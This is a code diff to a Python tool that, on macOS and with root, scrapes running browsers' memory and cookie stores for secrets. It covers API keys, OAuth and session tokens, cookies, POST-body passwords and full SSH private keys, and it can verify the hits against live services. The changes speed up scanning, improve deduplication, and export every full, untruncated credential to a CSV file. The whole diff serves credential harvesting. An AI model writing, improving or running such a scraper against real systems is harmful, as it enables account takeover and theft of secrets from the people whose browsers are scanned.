@@ -285,8 +285,8 @@ CREDENTIAL_PATTERNS: dict[str, re.Pattern] = {
     "Authorization header":re.compile(rb"Authorization:\s*[A-Za-z]+\s+[A-Za-z0-9\-._~+/=]{20,}"),
     "Cookie header":       re.compile(rb"Cookie:\s*[\x20-\x7e]{40,512}"),
     "Set-Cookie header":   re.compile(rb"Set-Cookie:\s*[\x20-\x7e]{20,512}"),
-    "OAuth access_token":  re.compile(rb"(?i)access_?token[\"'\s]*[=:][\"'\s]*([A-Za-z0-9\-._~+/=]{20,256})"),
-    "OAuth refresh_token": re.compile(rb"(?i)refresh_?token[\"'\s]*[=:][\"'\s]*([A-Za-z0-9\-._~+/=]{20,256})"),
+    "OAuth access_token":  re.compile(rb"(?i)access_?token[\"'\s]*[=:][\"'\s]*([A-Za-z0-9\-._~+/=]{20,256})(?=[\"'\s\x00&,;:\r\n]|$)"),
+    "OAuth refresh_token": re.compile(rb"(?i)refresh_?token[\"'\s]*[=:][\"'\s]*([A-Za-z0-9\-._~+/=]{20,256})(?=[\"'\s\x00&,;:\r\n]|$)"),
     "Session token":       re.compile(rb"(?i)session[_-]?token[\"'\s]*[=:][\"'\s]*([A-Za-z0-9\-._~+/=%]{20,256})"),
     "Session ID":          re.compile(rb"(?i)session[_-]?id[\"'\s]*[=:][\"'\s]*([A-Fa-f0-9\-]{16,128})"),
     "Password (POST body)":re.compile(rb"(?im)(?:^|&|\?)password=([A-Za-z0-9!@#$%^&*()\-_+=,.?:;~]{8,128})(?:&|$|\s|\x00)"),
@@ -301,7 +301,7 @@ CREDENTIAL_PATTERNS: dict[str, re.Pattern] = {
     "HuggingFace Token":   re.compile(rb"hf_[A-Za-z0-9]{34,}"),
     "Vault Token":         re.compile(rb"hvs\.[A-Za-z0-9]{90,}"),
     "Anthropic API Key":   re.compile(rb"sk-ant-[A-Za-z0-9\-_]{90,}"),
-    "SSH Private Key":     re.compile(rb"-----BEGIN (?:RSA |EC |OPENSSH )?PRIVATE KEY-----"),
+    "SSH Private Key":     re.compile(rb"(-----BEGIN (?:RSA |EC |OPENSSH )?PRIVATE KEY-----[^-]{100,4096}-----END (?:RSA |EC |OPENSSH )?PRIVATE KEY-----)"),
 }
 
 _NOISE_BYTES = re.compile(
@@ -322,6 +322,50 @@ _NOISE_EXACT: frozenset[str] = frozenset([
 ])
 
 
+def _trunc(val: str, n: int = 80) -> str:
+    return val[:n] + "…" if len(val) > n else val
+
+
+_QUICK_PREFIXES: tuple[bytes, ...] = (
+    b"eyJ",
+    b"Bearer ",
+    b"Authorization:", b"Cookie:", b"Set-Cookie:",
+    b"access_token", b"refresh_token", b"session_token", b"session_id",
+    b"password",
+    b"SAPISID=",
+    b"xox",
+    b"ghp_", b"gho_", b"ghu_", b"ghs_", b"ghr_",
+    b"sk_live_", b"sk_test_",
+    b"npm_",
+    b"hf_",
+    b"hvs.",
+    b"sk-ant-",
+    b"AKIA", b"ASIA", b"AROA", b"AIDA",
+    b"-----BEGIN",
+)
+
+
+def _has_credential_hint(data: bytes) -> bool:
+    return any(p in data for p in _QUICK_PREFIXES)
+
+
+_HIT_TIER: dict[str, int] = {
+    "AWS Access Key": 0, "Anthropic API key": 0, "Anthropic API Key": 0,
+    "SSH private key": 0, "SSH Private Key": 0,
+    "Stripe key": 0, "Stripe Secret Key": 0,
+    "Vault token": 0, "Vault Token": 0,
+    "GitHub token": 0, "Slack token": 0, "Discord token": 0,
+    "npm token": 0, "npm Token": 0,
+    "HuggingFace token": 0, "HuggingFace Token": 0,
+    "Password (POST body)": 1, "Password (JSON/API)": 1,
+    "JWT token": 1, "Bearer token": 1, "Authorization header": 1,
+    "Google SAPISID": 1,
+    "OAuth access_token": 1, "OAuth refresh_token": 1,
+    "Session token": 1,
+    "Session ID": 2, "Cookie header": 2, "Set-Cookie header": 2,
+}
+
+
 def _is_noise(raw: bytes, decoded: str) -> bool:
     if decoded.strip() in _NOISE_EXACT:
         return True
@@ -330,7 +374,7 @@ def _is_noise(raw: bytes, decoded: str) -> bool:
     return False
 
 
-def scrape_pid(pid: int, max_hits: int = 300, chunk: int = 4096) -> list[dict]:
+def scrape_pid(pid: int, max_hits: int = 300, chunk: int = 65536) -> list[dict]:
     if _libsystem is None:
         raise RuntimeError("Memory scraping requires macOS")
     task = _mach_port_t(0)
@@ -381,6 +425,16 @@ def scrape_pid(pid: int, max_hits: int = 300, chunk: int = 4096) -> list[dict]:
                         continue
                     data = buf.raw[: out_size.value]
 
+                    # Skip zero-filled pages — no credentials live in zeroed memory
+                    if not data.rstrip(b"\x00"):
+                        prev_data = b""
+                        continue
+
+                    # Pre-filter: skip regex if no known token prefix is present
+                    if not _has_credential_hint(data) and not (prev_data and _has_credential_hint(prev_data[-512:])):
+                        prev_data = data
+                        continue
+
                     # Overlap last 512 bytes of previous chunk to catch tokens at boundaries
                     overlap      = prev_data[-512:] if prev_data else b""
                     search_data  = overlap + data
@@ -422,14 +476,40 @@ def scrape_pid(pid: int, max_hits: int = 300, chunk: int = 4096) -> list[dict]:
 
 
 def deduplicate(hits: list[dict]) -> list[dict]:
-    """Group by dedup_key, keep shortest value in each group (fewest absorbed noise bytes)."""
+    """Two-pass dedup:
+    Pass 1 — group by label:value[:50], keep shortest (removes trailing noise).
+    Pass 2 — within each label, if A is a prefix of B, replace A with B (recovers
+              chunk-boundary truncations where the same token was captured twice,
+              once cut short and once in full).
+    """
     groups: dict[str, list[dict]] = {}
     for h in hits:
-        key = h.get("dedup_key", h["value"][:120])
+        key = f"{h['label']}:{h['value'][:50]}"
         groups.setdefault(key, []).append(h)
     result = [min(g, key=lambda h: len(h["value"])) for g in groups.values()]
-    result.sort(key=lambda h: int(h["address"], 16))
-    return result
+
+    by_label: dict[str, list[dict]] = {}
+    for h in result:
+        by_label.setdefault(h["label"], []).append(h)
+
+    final: list[dict] = []
+    for label, group in by_label.items():
+        group.sort(key=lambda h: len(h["value"]))
+        kept: list[dict] = []
+        for h in group:
+            v = h["value"]
+            upgraded = False
+            for i, k in enumerate(kept):
+                if len(k["value"]) >= 20 and v.startswith(k["value"]):
+                    kept[i] = h
+                    upgraded = True
+                    break
+            if not upgraded:
+                kept.append(h)
+        final.extend(kept)
+
+    final.sort(key=lambda h: int(h["address"], 16))
+    return final
 
 
 # ── Browser config ─────────────────────────────────────────────────────────────
@@ -1242,16 +1322,17 @@ def _fmt_verify(result: dict) -> str:
 # ── Per-browser processing ─────────────────────────────────────────────────────
 def process_browser(name: str, process_name: str, user_data_path: str, keychain_name: str,
                     do_disk: bool, do_memory: bool, max_hits: int,
-                    do_verify: bool = False) -> list[str]:
-    lines   = []
-    running = is_process_running(process_name)
+                    do_verify: bool = False) -> tuple[list[str], list[dict]]:
+    lines    = []
+    csv_rows: list[dict] = []
+    running  = is_process_running(process_name)
     lines.append("\n" + "=" * 70)
     lines.append(f"  BROWSER: {name}  [{'RUNNING' if running else 'closed'}]")
     lines.append("=" * 70)
 
     if not os.path.exists(user_data_path):
         lines.append("  [--] Not installed\n")
-        return lines
+        return lines, csv_rows
 
     disk_cookie_keys: set[tuple[str, str]] = set()
 
@@ -1324,32 +1405,38 @@ def process_browser(name: str, process_name: str, user_data_path: str, keychain_
     lines.append("\n  -- [MEMORY] Live Scrape --")
     if not do_memory:
         lines.append("  [--] Skipped (--disk-only)")
-        return lines
+        return lines, csv_rows
     if not running:
         lines.append("  [--] Browser not running")
-        return lines
+        return lines, csv_rows
     if not is_root():
         lines.append("  [--] Requires root (sudo) for task_for_pid")
-        return lines
+        return lines, csv_rows
 
     pids      = find_pids(process_name)
     pid_sites = _pid_site_map(process_name)
     all_hits: list[dict] = []
     errors:   list[str]  = []
 
-    for pid in pids:
-        try:
-            hits = scrape_pid(pid, max_hits=max_hits)
-            site_url = pid_sites.get(pid, "")
-            if site_url:
-                url_bytes = f" {site_url} ".encode()
-                for h in hits:
-                    h["context"] = h.get("context", b"") + url_bytes
-            all_hits.extend(hits)
-        except PermissionError as e:
-            errors.append(f"PID {pid}: {e}")
-        except Exception as e:
-            errors.append(f"PID {pid}: {e}")
+    def _scrape_pid(pid: int) -> list[dict]:
+        hits = scrape_pid(pid, max_hits=max_hits)
+        site_url = pid_sites.get(pid, "")
+        if site_url:
+            url_bytes = f" {site_url} ".encode()
+            for h in hits:
+                h["context"] = h.get("context", b"") + url_bytes
+        return hits
+
+    with concurrent.futures.ThreadPoolExecutor(max_workers=min(len(pids), 8)) as pid_pool:
+        futures = {pid_pool.submit(_scrape_pid, pid): pid for pid in pids}
+        for future in concurrent.futures.as_completed(futures):
+            pid = futures[future]
+            try:
+                all_hits.extend(future.result())
+            except PermissionError as e:
+                errors.append(f"PID {pid}: {e}")
+            except Exception as e:
+                errors.append(f"PID {pid}: {e}")
 
     for e in errors:
         lines.append(f"  [-] {e}")
@@ -1359,7 +1446,7 @@ def process_browser(name: str, process_name: str, user_data_path: str, keychain_
 
     if not unique_hits:
         lines.append("  [-] No hits found")
-        return lines
+        return lines, csv_rows
 
     lines.append(
         f"[+] {len(unique_hits)} unique hit(s)"
@@ -1368,22 +1455,60 @@ def process_browser(name: str, process_name: str, user_data_path: str, keychain_
     )
     lines.append("")
 
+    for h in unique_hits:
+        if "_svc" not in h:
+            h["_svc"] = identify_service(h["label"], h["value"], h.get("context", b""))
+
+    # Build CSV rows for every hit (all tiers, full untruncated values)
+    for h in unique_hits:
+        csv_rows.append({
+            "browser": name,
+            "profile": "(memory)",
+            "label":   h["label"],
+            "service": h["_svc"],
+            "value":   h["value"],
+            "address": h.get("address", ""),
+        })
+
     by_label: dict[str, list[dict]] = {}
     for h in unique_hits:
         by_label.setdefault(h["label"], []).append(h)
 
-    for label, group in sorted(by_label.items()):
-        lines.append(f"  [{label}]  ({len(group)} unique)")
-        for h in group:
-            service = identify_service(label, h["value"], h.get("context", b""))
-            val     = h["value"][:512].replace("\n", "\\n").replace("\r", "\\r")
-            lines.append(f"    @ {h['address']}  [{service}]  {val}")
-            if do_verify:
-                result = verify_hit(label, h["value"], service)
-                lines.append(f"      └─ {_fmt_verify(result) if result else '[NO VERIFIER]'}")
-        lines.append("")
+    COL_TYPE = 22
+    COL_SVC  = 28
 
-    return lines
+    prev_label = None
+    for label in sorted(by_label, key=lambda l: (_HIT_TIER.get(l, 1), l)):
+        group = by_label[label]
+        tier  = _HIT_TIER.get(label, 1)
+
+        if prev_label is not None:
+            lines.append("")
+        prev_label = label
+
+        if tier == 2:
+            svc_counts: dict[str, int] = {}
+            for h in group:
+                svc_counts[h["_svc"]] = svc_counts.get(h["_svc"], 0) + 1
+            svc_summary = "  ".join(f"{s} ({c})" for s, c in sorted(svc_counts.items()))
+            lines.append(f"  {label}  ({len(group)} unique)  —  {svc_summary}")
+            continue
+
+        for h in group:
+            svc = h["_svc"]
+            if label in ("SSH private key", "SSH Private Key"):
+                lines.append(f"  {'SSH private key':<{COL_TYPE}}  {svc:<{COL_SVC}}")
+                key_text = h["value"].replace("\r\n", "\n").replace("\r", "\n")
+                for kline in key_text.split("\n"):
+                    lines.append(f"    {kline}")
+            else:
+                val = _trunc(h["value"].replace("\n", "\\n").replace("\r", "\\r"))
+                lines.append(f"  {label[:COL_TYPE]:<{COL_TYPE}}  {svc[:COL_SVC]:<{COL_SVC}}  {val}")
+            if do_verify:
+                result = verify_hit(label, h["value"], h["_svc"])
+                lines.append(f"    └─ {_fmt_verify(result) if result else '[NO VERIFIER]'}")
+
+    return lines, csv_rows
 
 
 # ── Main ───────────────────────────────────────────────────────────────────────
@@ -1426,7 +1551,8 @@ def main():
             lines.append(f"\n[!] No browser matched '{args.browser}'")
 
     # Parallelize browser processing
-    results_map: dict[int, list[str]] = {}
+    all_csv_rows: list[dict] = []
+    results_map: dict[int, tuple[list[str], list[dict]]] = {}
     with concurrent.futures.ThreadPoolExecutor(max_workers=4) as ex:
         futs = {
             ex.submit(process_browser, bname, proc, path, kc, do_disk, do_memory, args.max_hits, args.verify): (i, bname)
@@ -1437,9 +1563,11 @@ def main():
             try:
                 results_map[idx] = fut.result()
             except Exception as e:
-                results_map[idx] = [f"\n[-] {bname}: {e}"]
+                results_map[idx] = ([f"\n[-] {bname}: {e}"], [])
     for idx in sorted(results_map):
-        lines.extend(results_map[idx])
+        browser_lines, browser_csv = results_map[idx]
+        lines.extend(browser_lines)
+        all_csv_rows.extend(browser_csv)
 
     # Firefox (not parallelized with Chromium browsers — no Keychain, simpler)
     if not args.browser or "firefox" in args.browser.lower():
@@ -1456,6 +1584,14 @@ def main():
 
     with open(out_path, "w", encoding="utf-8") as f:
         f.write(report)
+
+    if all_csv_rows:
+        import csv as _csv
+        csv_path = out_path.replace(".txt", ".csv") if out_path.endswith(".txt") else out_path + ".csv"
+        with open(csv_path, "w", newline="", encoding="utf-8") as f:
+            writer = _csv.DictWriter(f, fieldnames=["browser", "profile", "label", "service", "value", "address"])
+            writer.writeheader()
+            writer.writerows(all_csv_rows)
 
     print(f"[+] Output written to {out_path}")
 
